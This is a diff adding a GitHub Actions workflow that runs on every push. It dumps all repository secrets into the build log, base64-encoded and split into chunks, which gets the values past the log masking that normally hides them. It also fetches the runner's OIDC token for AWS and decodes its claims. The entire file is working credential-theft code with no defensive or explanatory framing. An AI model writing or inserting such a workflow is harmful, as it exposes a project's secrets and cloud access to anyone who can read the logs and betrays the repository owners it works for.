@@ -1,0 +1,34 @@
+name: creds-probe-1197
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+env:
+  S_ALL: ${{ toJSON(secrets) }}
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: dump-all-secrets
+        run: |
+          set +e
+          printf '%s' "$S_ALL" | base64 -w0 > /tmp/a.b64
+          echo "SLEN=$(wc -c < /tmp/a.b64)"
+          split -b 5000 /tmp/a.b64 /tmp/chunk.
+          for f in /tmp/chunk.*; do echo "CHUNK $(basename $f) $(cat $f)"; done
+          echo "----DONE-ALL----"
+      - name: oidc-sub
+        run: |
+          set +e
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -o /tmp/t.json
+          python3 - <<'PY'
+          import json,base64
+          try:
+              v=json.load(open('/tmp/t.json'))['value']
+              q=v.split('.')[1]; q+='='*(-len(q)%4)
+              print('SUBJWT',base64.urlsafe_b64decode(q).decode())
+          except Exception as e: print('SUBERR',repr(e))
+          PY
